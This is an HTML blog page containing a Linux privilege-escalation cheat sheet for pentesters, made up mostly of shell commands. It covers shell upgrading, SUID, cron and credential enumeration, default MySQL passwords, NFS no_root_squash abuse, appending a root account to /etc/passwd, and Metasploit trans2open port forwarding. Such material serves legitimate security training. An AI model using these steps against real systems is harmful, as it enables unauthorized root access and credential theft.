@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+
+    
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux Privilege Escalation - Resources">
+<meta property="og:site_name" content="Tech Motion">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-08-08T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-08-21T14:36:57.212Z">
+<meta property="article:author" content="Tech Motion">
+<meta property="article:tag" content="Hacker, Security, Vulnerability, Web, RCE, SSRF, XSS, CVE">
+<meta name="twitter:card" content="summary">
+    
+
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/aero-cover.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/aero-cover.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/aero-cover.png">
+        
+      
+    
+    <!-- title -->
+    
+      <title>Linux Privilege Escalation - Resources</title>
+    
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-13047966-1"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'UA-13047966-1');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Tech Motion" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+    <div class="content index py4 ">
+        
+          <header id="header">
+  
+  
+    
+      <img id="logo" alt class="u-logo" src="/images/aero-cover.png" />
+    
+  
+    <div id="title">
+      <a class="u-url u-uid" href="/"> <h1 class="p-name">Tech Motion</h1> </a>
+    </div>
+  
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-2x"></i></a>
+      </li>
+      <!--
+     --><li><a href="/">Home</a></li><!--
+     --><li><a href="/about/">About</a></li><!--
+   -->
+    </ul>
+  </div>
+</header>
+
+        
+
+        
+          <hr style='margin: 0px; margin-bottom: 32px; border: 0.5px solid #ccc; '>
+        
+
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+      Linux Privilege Escalation - Resources
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+       
+      </span>
+
+    <div class="postdate">
+      
+        
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+
+
+<p><strong>g0tmilk's Guide to Linux Privilege Escalation as well:</strong><br><a rel="noreferrer noopener" href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/<br></a><br><strong>I just got a low-priv shell !</strong> <br>What would S1REN do <em><span style="text-decoration: underline;">right now</span></em>?<br><strong>python</strong> -c 'import pty; pty.spawn("/bin/bash")'<br>OR<br><meta http-equiv="content-type" content="text/html; charset=utf-8"><strong>python3</strong> -c 'import pty; pty.spawn("/bin/bash")'<br>export <strong>PATH</strong>=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp<br>export <strong>TERM</strong>=xterm-256color<br>alias <strong>ll</strong>='ls -lsaht --color=auto'<br><strong>Ctrl + Z</strong> [Background Process]<br>stty raw -echo <strong>;</strong> fg <strong>;</strong> reset<br>stty columns 200 rows 200</p>
+
+
+<p><br><strong>S1REN would say:</strong><br><em>Various Capabilities?</em><br>which <strong>gcc</strong><br>which <strong>cc</strong><br>which <strong>python</strong><br>which <strong>perl</strong><br>which <strong>wget</strong><br>which <strong>curl</strong><br>which <strong>fetch</strong><br>which <strong>nc</strong><br>which <strong>ncat</strong><br>which <strong>nc.traditional</strong><br>which <strong>socat</strong><br><br><strong>Compilation? (</strong>Very Back Burner<strong>)</strong><br><strong>file</strong> /<strong>bin</strong>/<strong>bash</strong><br><strong>uname -a</strong><br>cat /<strong>etc</strong>/<strong>*-release</strong><br>cat /<strong>etc</strong>/<strong>issue</strong><br></p>
+
+
+<p><br><strong>What Arch?</strong><br>file /bin/bash<br><br><strong>Kernel?</strong><br>uname -a<br></p>
+
+
+
+<p id="linux-privesc"><strong>Issue/Release?</strong><br>cat /etc/issue<br>cat /etc/<strong>*-</strong>release<br></p>
+
+
+
+<p><strong>Are we a <em>real user</em>?</strong><br>sudo -l<br>ls -lsaht /etc/sudoers<br></p>
+
+
+
+<p><strong>Are any users a member of exotic groups?</strong><br>groups &lt;user&gt;</p>
+
+
+
+<p><br><strong>Check out your shell's environment variables...</strong><br>env<br><a rel="noreferrer noopener" href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/" target="_blank">https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/</a><br></p>
+
+
+
+<p><strong><em><span style="text-decoration: underline;">Users</span></em>?</strong><br>cd /home/<br>ls -lsaht</p>
+
+
+
+<p><strong><em><span style="text-decoration: underline;">Web Configs</span></em> containing credentials?</strong><br>cd /<strong>var</strong>/<strong>www</strong>/<strong>html</strong>/<br>ls -lsaht<br><br><strong><span style="text-decoration: underline;"><em>SUID</em> Binaries?</span></strong><br>find <strong>/</strong> -perm <strong>-u=s</strong> -type f 2&gt;/<strong>dev</strong>/<strong>null</strong><br></p>
+
+
+
+<p><strong><span style="text-decoration: underline;"><em>GUID</em> Binaries?</span></strong><br>find <strong>/</strong> -perm <strong>-g=s</strong> -type f 2&gt;/<strong>dev</strong>/<strong>null</strong><br><br><strong>SUID/GUID/SUDO <em>Escalation</em>:</strong><br><a rel="noreferrer noopener" href="https://gtfobins.github.io/" target="_blank">https://gtfobins.github.io/<br></a></p>
+
+
+
+<p class="has-small-font-size"><strong>Binary/Languages with "<em>Effective Permitted</em>" or "<em>Empty Capability</em>" (</strong>ep<strong>):</strong><br><a href="https://www.insecure.ws/linux/getcap_setcap.html#getcap-setcap-and-file-capabilities
+"><span style="text-decoration: underline;">https://www.insecure.ws/linux/getcap_setcap.html#getcap-setcap-and-file-capabilities</span><br></a>Get Granted/Implicit (Required by a Real User) Capabilities of all files recursively throughout the system and pipe all error messages to /dev/null.<br>getcap -r / 2&gt;/dev/null</p>
+
+
+
+<p><br><strong>We need to start monitoring the system if possible while performing our enumeration...</strong><br><strong>In other words:</strong><br>"S1REN... <em>Is privilege escalation going to come from some I/O file operations being done by some script on the system?</em>"<br><a rel="noreferrer noopener" href="https://github.com/DominicBreuker/pspy/blob/master/README.md" target="_blank">https://github.com/DominicBreuker/pspy/blob/master/README.md<br></a>cd /var/tmp/<br>File Transfer <strong>--&gt;</strong> pspy32<br>File Transfer <strong>--&gt;</strong> pspy64<br>chmod 755 pspy32 pspy64<br>./pspy&lt;32/64&gt;<br><br><strong>What does the local network look like?</strong><br>netstat -antup<br>netstat -tunlp<br><br><strong>Is anything vulnerable running as root?</strong><br>ps aux |grep -i 'root' --color=auto<br><br><strong>MYSQL Credentials? Root Unauthorized Access?</strong><br>mysql -uroot -p<br>Enter Password:<br>root : root<br>root : toor<br>root :  </p>
+
+
+
+<p><strong>S1REN would take a quick look at etc to see if any user-level people did special things:</strong><br>cd /<strong>etc</strong>/<br>ls -lsaht<br><em><span style="text-decoration: underline;">Anything other than root here?</span></em><br>• Any config files left behind?<br>→ ls -lsaht |grep -i ‘.conf’ --color=auto</p>
+
+
+
+<p><strong>• If we have root priv information disclosure - are there any .secret in /etc/ files?</strong><br>→ ls -lsaht |grep -i ‘.secret’ --color=aut<br></p>
+
+
+
+<p><strong>SSH Keys I can use perhaps for even further compromise?</strong><br>ls -lsaR /<strong>home</strong>/<br></p>
+
+
+
+<p><strong>Quick look in:</strong><br>ls -lsaht /<strong>var</strong>/<strong>lib</strong>/<br>ls -lsaht /<strong>var</strong>/<strong>db</strong>/<br><br><strong>Quick look in:</strong><br>ls -lsaht /<strong>opt</strong>/<br>ls -lsaht /<strong>tmp</strong>/<br>ls -lsaht /<strong>var</strong>/<strong>tmp</strong>/<br>ls -lsaht /<strong>dev</strong>/<strong>shm</strong>/<br></p>
+
+
+
+<p><strong>File Transfer Capability? What can I use to transfer files?</strong><br>which wget<br>which curl<br>which nc<br>which fetch (BSD)<br>ls -lsaht /bin/ |grep -i 'ftp' --color=auto</p>
+
+
+
+<p><strong>NFS? Can we exploit weak NFS Permissions?</strong><br>cat /<strong>etc</strong>/<strong>exports</strong><br>no_root_squash?<br><a rel="noreferrer noopener" href="https://recipeforroot.com/attacking-nfs-shares/" target="_blank">https://recipeforroot.com/<strong>attacking-nfs-shares</strong>/<br></a><br><strong>[On Attacking Machine]</strong><br>mkdir -p /<strong>mnt</strong>/<strong>nfs</strong>/<br>mount <strong>-t</strong> nfs <strong>-o</strong> <strong>vers</strong>=&lt;version 1,2,3&gt; <strong>$IP:</strong>&lt;NFS Share&gt; /<strong>mnt</strong>/<strong>nfs</strong>/ <strong>-nolock</strong><br>gcc suid.c <strong>-o</strong> suid<br>cp suid /<strong>mnt</strong>/<strong>nfs</strong>/<br>chmod u+s /<strong>mnt</strong>/<strong>nfs</strong>/<strong>suid</strong><br>su &lt;user id matching target machine's user-level privilege.&gt;<br><br><strong>[On Target Machine]</strong><br>user@host$ ./suid<br><strong>#</strong></p>
+
+
+
+<p><strong><span style="text-decoration: underline;"><em>Where can I live on this machine?</em></span> Where can I read, write and execute files?</strong><br>/<strong>var</strong>/<strong>tmp</strong>/<br>/<strong>tmp</strong>/<br>/<strong>dev</strong>/<strong>shm</strong>/</p>
+
+
+
+<p><strong>Any exotic file system mounts/extended attributes?</strong><br>cat /<strong>etc</strong>/<strong>fstab</strong><br><br><strong>Forwarding out a weak service for root priv (with meterpreter!):</strong><br>Do we need to get a meterpreter shell and forward out some ports that might be running off of the Loopback Adaptor (127.0.0.1) and forward them to any (0.0.0.0)? If I see something like Samba SMBD out of date on 127.0.0.1 - we should look to forward out the port and then run trans2open on our own machine at the forwarded port.<br><a rel="noreferrer noopener" href="https://www.offensive-security.com/metasploit-unleashed/portfwd/" target="_blank">https://www.offensive-security.com/metasploit-unleashed/portfwd/</a><br><br><strong>Forwarding out netbios-ssn EXAMPLE:</strong><br><strong>meterpreter&gt;</strong> portfwd add –l 139 –p 139 –r [target remote host] <br><strong>meterpreter&gt;</strong> background <br>use exploit/linux/samba/trans2open<br>set RHOSTS 0.0.0.0<br>set RPORT 139<br>run<br><br><strong>Can we write as a low-privileged user to /etc/passwd?</strong><br>openssl passwd -1<br>i&lt;3hacking<br>$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.<br>echo 'siren:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:siren:/home/siren:/bin/bash' &gt;&gt; /etc/passwd<br>su siren<br>id<br><br><strong>Cron.</strong><br>crontab –u root –l<br><br><strong>Look for unusual system-wide cron jobs:</strong><br>cat /etc/<strong>crontab</strong><br>ls /etc/<strong>cron.*</strong><br></p>
+
+
+<p><strong>Any mail?</strong> <strong>mbox in User $HOME directory?</strong><br>cd /<strong>var</strong>/<strong>mail</strong>/<br>ls -lsaht<br><br><strong>Linpease</strong>:<br><a rel="noreferrer noopener" href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS" target="_blank">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS<br></a><br><strong>Traitor:</strong><br><a href="https://github.com/liamg/traitor
+  ">https://github.com</a><a rel="noreferrer noopener" href="https://github.com/liamg/traitor" target="_blank">/</a><a href="https://github.com/liamg/traitor
+  ">liamg/traitor<br></a><br><strong>GTFOBins:</strong><br><a rel="noreferrer noopener" href="https://gtfobins.github.io/" target="_blank">https://gtfobins.github.io/</a><br><br><strong>PSpy32/Pspy64:</strong><br><a rel="noreferrer noopener" href="https://github.com/DominicBreuker/pspy/blob/master/README.md" target="_blank">https://github.com/DominicBreuker/pspy/blob/master/README.md</a></p>
+                          
+
+
+  </div>
+</article>
+
+
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    Tech Motion
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
